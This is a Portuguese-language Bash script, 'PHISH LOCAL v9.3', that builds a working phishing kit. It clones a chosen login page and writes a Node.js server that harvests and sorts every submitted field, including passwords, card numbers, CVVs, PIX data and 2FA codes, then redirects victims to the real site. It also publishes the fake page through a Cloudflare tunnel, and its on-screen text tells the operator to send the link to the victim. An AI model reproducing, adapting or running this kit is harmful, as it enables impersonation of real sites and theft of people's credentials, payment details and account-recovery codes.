#!/bin/bash
# ============================================
# 🎣 PHISH LOCAL v9.3 - Universal Wordlist
# Captura QUALQUER campo de QUALQUER site
# Cloudflare Tunnel | Sem root | Sem login
# ============================================

SITE_DIR="site_clone"
LOG_FILE="capturas.txt"
SERVER_FILE="server/server.js"

# Resultados
clear
echo ""
echo "=========================================="
echo "  🎣 PHISH LOCAL v9.3"
echo "=========================================="
echo ""
echo "  1) Criar phishing"
echo "  2) Ver capturas"
echo "  3) Limpar capturas"
echo "  4) Sair"
echo ""
echo -n "Escolha: "
read CHOICE

case "$CHOICE" in
1)
    # --- ESCOLHER ALVO ---
    echo ""
    echo -n "URL do site (ex: https://instagram.com): "
    read URL

    URL=$(echo "$URL" | tr -d '\r' | xargs)
    [ -z "$URL" ] && URL="https://instagram.com"

    if ! echo "$URL" | grep -qE '^https?://'; then
        URL="https://$URL"
    fi

    DOMAIN=$(echo "$URL" | sed -E 's|https?://||;s|/.*||')
    echo ""
    echo "[!] Alvo: $URL"
    echo "[!] Dominio: $DOMAIN"
    # --- CLONAR SITE ---
    echo ""
    echo "[...] Clonando site..."
    rm -rf "$SITE_DIR"
    mkdir -p "$SITE_DIR"

    USER_AGENT="Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"

    curl -s -L -H "User-Agent: $USER_AGENT" -o "$SITE_DIR/index.html" "$URL" 2>/dev/null

    if [ ! -s "$SITE_DIR/index.html" ]; then
        echo "[!] Nao foi possivel clonar. Usando pagina padrao."
        cat > "$SITE_DIR/index.html" << 'EOF'
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}
h1{font-size:44px;font-weight:300;margin-bottom:30px}
input{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}
input:focus{border-color:#a8a8a8}
button{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}
button:active{background:#1877f2}
</style>
</head>
<body>
<div class="card"><h1>Login</h1>
<form method="POST"action="/login">
<input type="text" name="username" placeholder="Usuario ou email" required>
<input type="password" name="password" placeholder="Senha" required>
<button type="submit">Entrar</button>
</form></div>
</body>
</html>
EOF
    fi

    # baixar imagens/css
    grep -oE 'url\([^)]+\)' "$SITE_DIR/index.html" 2>/dev/null | head -20 | while read -r img; do
        img=$(echo "$img" | sed -E 's/url\("//;s/"\)//')
        if echo "$img" | grep -qE '\.(css|png|jpg|jpeg|gif|svg|ico)'; then
            if echo "$img" | grep -qE '^//'; then
                img="https:$img"
            elif echo "$img" | grep -qvE '^https?://'; then
                img="${URL%/}/$img"
            fi
            fname=$(basename "$img" | sed 's/[^a-zA-Z0-9._-]/_/g')
            curl -s -L -o "$SITE_DIR/$fname" "$img" 2>/dev/null
        fi
    done

    sed -i 's/<form/<form method="POST" action="\/login"/gi' "$SITE_DIR/index.html" 2>/dev/null
    sed -i 's/action="[^"]*"/action="\/login"/gi' "$SITE_DIR/index.html" 2>/dev/null

    echo ""
    echo "[OK] Site clonado!"

    # --- CRIAR SERVIDOR ---
    cat > "$SERVER_FILE" << 'SERVEREOF'
const http=require('http'),fs=require('fs'),path=require('path');
const PORT=process.env.PORT||8080;
const SITE_DIR=process.env.SITE_DIR||'site_clone';
const LOG_FILE=process.env.LOG_FILE||'capturas.txt';
const REDIRECT=process.env.REDIRECT||'https://instagram.com';

const WORDLIST=['login','signin','sign_in','log_in','entrar','acessar','iniciar','cadastrar','registrar','username','user','email','e-mail','telefone','phone','cpf','cnpj','matricula','identifier','userid','password','senha','pass','passwd','pwd','palavra','chave','secret','pin','codigo','nome','name','fullname','firstname','lastname','sobrenome','social_name','razao_social','mae','pai','data','date','nascimento','birth','birthdate','ano','mes','dia','endereco','rua','avenida','address','street','cep','zip','zipcode','bairro','cidade','pais','country','complemento','empresa','company','trabalho','profissao','escola','universidade','curso','departamento','cargo','cartao','card','credit_card','cvv','validade','conta','banco','agencia','pix','token','otp','verification','captcha','2fa','auth','pergunta','resposta','termos','terms','privacidade','privacy','aceitar','remember','newsletter'];

function classifyField(name){
    name=(name||'').toLowerCase().replace(/[^a-z0-9_]/g,'');
    for(const w of WORDLIST){
        if(name.includes(w)||w.includes(name)){
            if(['login','signin','sign_in','log_in','entrar','acessar','iniciar','cadastrar','registrar','username','user','email','e-mail','telefone','phone','cpf','cnpj','matricula','identifier','userid'].some(x=>w.includes(x)||x.includes(w)))return'USUARIO';
            if(['password','senha','pass','passwd','pwd','palavra','chave','secret','pin','codigo'].some(x=>w.includes(x)||x.includes(w)))return'SENHA';
            if(['nome','name','fullname','firstname','lastname','sobrenome','social_name','razao_social','mae','pai'].some(x=>w.includes(x)||x.includes(w)))return'NOME';
            if(['data','date','nascimento','birth','birthdate','ano','mes','dia'].some(x=>w.includes(x)||x.includes(w)))return'DATA';
            if(['endereco','rua','avenida','address','street','cep','zip','zipcode','bairro','cidade','pais','country','complemento'].some(x=>w.includes(x)||x.includes(w)))return'ENDERECO';
            if(['empresa','company','trabalho','profissao','escola','universidade','curso','departamento','cargo','matricula'].some(x=>w.includes(x)||x.includes(w)))return'ESCOLA_TRABALHO';
            if(['cartao','card','credit_card','cvv','validade','conta','banco','agencia','pix'].some(x=>w.includes(x)||x.includes(w)))return'PAGAMENTO';
            if(['token','otp','verification','captcha','2fa','auth','pergunta','resposta'].some(x=>w.includes(x)||x.includes(w)))return'SEGURANCA';
            if(['termos','terms','privacidade','privacy','aceitar','remember','newsletter'].some(x=>w.includes(x)||x.includes(w)))return'PREFERENCIA';
            return'EXTRA';
        }
    }
    return'OUTRO';
}

function saveCapture(body,ip){
    try{
        const p=new URLSearchParams(body);
        const allFields={};
        const classified={USUARIO:[],SENHA:[],NOME:[],DATA:[],ENDERECO:[],ESCOLA_TRABALHO:[],PAGAMENTO:[],SEGURANCA:[],PREFERENCIA:[],EXTRA:[],OUTRO:[]};
        for(let[k,v]of p.entries()){
            allFields[k]=v;
            const cat=classifyField(k);
            classified[cat].push(k+': '+v);
        }
        const ts=new Date().toISOString().replace('T',' ').split('.')[0];
        fs.appendFileSync(LOG_FILE,JSON.stringify({timestamp:ts,ip:ip,fields:allFields,classified:classified})+'\n');
        console.log('\n'+'='.repeat(50));
        console.log('  CAPTURADO - '+ts);
        console.log('  IP: '+ip);
        console.log('='.repeat(50));
        for(const[cat,vals]of Object.entries(classified)){
            if(vals.length>0)console.log('  ['+cat+'] '+vals.join(' | '));
        }
        console.log('='.repeat(50)+'\n');
    }catch(e){}
}

http.createServer((req,res)=>{
    const ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    if(req.method==='POST'){
        let b='';
        req.on('data',c=>b+=c);
        req.on('end',()=>{
            saveCapture(b,ip);
            res.writeHead(302,{'Location':REDIRECT});
            res.end();
        });
        return;
    }
    let f=req.url==='/'?'/index.html':req.url.split('?')[0];
    f=path.join(SITE_DIR,f);
    const ext=path.extname(f).toLowerCase();
    const MIME={'.html':'text/html','.css':'text/css','.js':'application/javascript','.png':'image/png','.jpg':'image/jpeg','.jpeg':'image/jpeg','.gif':'image/gif','.svg':'image/svg+xml','.ico':'image/x-icon','.webp':'image/webp','.woff':'font/woff','.woff2':'font/woff2','.ttf':'font/ttf','.json':'application/json'};
    fs.readFile(f,(er,d)=>{
        if(er){
            res.writeHead(200,{'Content-Type':'text/html'});
            res.end('<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">\n<meta name="viewport" content="width=device-width,initial-scale=1.0">\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nbody{font-family:-apple-system,BlinkMacSystemFont:"Segoe UI",Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}\n.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}\nh1{font-size:44px;font-weight:300;margin-bottom:30px}\ninput{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}\ninput:focus{border-color:#a8a8a8}\nbutton{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}\nbutton:active{background:#1877f2}\n</style></head><body>\n<div class="card"><h1>Login</h1>\n<form method="POST"action="/login">\n<input type="text" name="username" placeholder="Usuario ou email" required>\n<input type="password" name="password" placeholder="Senha" required>\n<button type="submit">Entrar</button>\n</form></div></body></html>');
            return;
        }
        res.writeHead(200,{'Content-Type':MIME[ext]||'application/octet-stream'});
        res.end(d);
    });
}).listen(PORT,'0.0.0.0',()=>console.log('Servidor ativo porta '+PORT));
SERVEREOF

    # --- OBTER IP E PORT ---
    PORT=8080
    IP=$(hostname -I 2>/dev/null | tr -d '
' | awk '{print $1}')
    [ -z "$IP" ] && IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    [ -z "$IP" ] && IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
    [ -z "$IP" ] && IP="127.0.0.1"
    export PORT

    # --- CLOUDFLARE TUNNEL ---
    CF_INSTALLED=false
    if command -v cloudflared &>/dev/null; then
        CF_INSTALLED=true
    fi

    echo ""
    echo "=========================================="
    echo "  CLOUDFLARE TUNNEL (Link Publico Gratis)"
    echo "=========================================="
    echo ""

    if [ "$CF_INSTALLED" = true ]; then
        echo "[OK] Cloudflared ja instalado!"
        echo ""
        echo "  1) Usar Cloudflare Tunnel (recomendado)"
        echo "  2) Usar so o IP local"
        echo ""
        echo -n "Escolha: "
        read CF_CHOICE
    else
        echo "Cloudflared nao instalado."
        echo ""
        echo "Para instalar (recomendado):"
        echo "  pkg install cloudflared"
        echo ""
        echo "  1) Instalar cloudflared agora"
        echo "  2) Usar so o IP local"
        echo ""
        echo -n "Escolha: "
        read CF_CHOICE

        if [ "$CF_CHOICE" = "1" ]; then
            echo "[...] Instalando cloudflared..."
            pkg install cloudflared -y 2>/dev/null
            if command -v cloudflared &>/dev/null; then
                CF_INSTALLED=true
                echo "[OK] Instalado!"
            else
                echo "[ERRO] Falha na instalacao. Usando IP local."
                CF_CHOICE=2
            fi
        fi
    fi

    # --- INICIAR SERVIDOR ---
    echo ""
    echo "[*] Iniciando servidor..."
    echo ""
    node "$SERVER_FILE" &
    SERVER_PID=$!
    sleep 2

    CF_URL=""
    if [ "$CF_CHOICE" = "1" ] && [ "$CF_INSTALLED" = true ]; then
        echo ""
        echo "[...] Criando tunnel... aguarde..."
        echo ""

        cloudflared tunnel --url "http://0.0.0.0:$PORT" > /tmp/cf_tunnel.log 2>&1 &
        CF_PID=$!

        for i in $(seq 1 20); do
            sleep 1
            CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log 2>/dev/null | head -1)
            if [ -n "$CF_URL" ]; then
                break
            fi
        done

        if [ -n "$CF_URL" ]; then
            echo "[OK] Tunnel criado!"
        else
            echo "[AVISO] Tunnel nao gerou URL em 20s. Verifique o cloudflared."
        fi
    fi

    # --- MOSTRAR RESULTADO ---
    clear
    echo ""
    echo "=========================================="
    echo "         SERVIDOR PRONTO!"
    echo "=========================================="
    echo ""
    if [ -n "$CF_URL" ]; then
        echo "  🔥 URL PUBLICA (MANDE PRA VITIMA):"
        echo ""
        echo "    ${CF_URL}"
        echo ""
        echo "  Funciona de QUALQUER lugar do mundo!"
        echo "  (a pessoa clica e abre o site clonado)"
    else
        echo "  Acesse de qualquer dispositivo na mesma rede:"
        echo "  http://${IP}:8080"
    fi
    echo ""
    echo "  Parar: Ctrl+C"
    echo ""

    if [ -n "$CF_URL" ]; then
        echo ""
        echo "  🔥 LEMBRE-SE - URL da VITIMA:"
        echo "    ${CF_URL}"
        echo ""
    fi

    echo ""
    echo "Aguardando capturas... (Ctrl+C para parar)"
    echo ""

    wait $SERVER_PID
    ;;

2)
    echo ""
    echo "=========================================="
    echo "  CAPTURAS"
    echo "=========================================="
    echo ""
    if [ -f "$LOG_FILE" ]; then
        cat "$LOG_FILE"
    else
        echo "Nenhuma captura ainda."
    fi
    echo ""
    echo "Pressione ENTER para voltar..."
    read
    ;;

3)
    > "$LOG_FILE"
    echo "[OK] Capturas limpas!"
    sleep 1
    ;;

4)
    echo "Saindo..."
    exit 0
    ;;

*)
    echo "Opcao invalida!"
    sleep 1
    ;;
esac
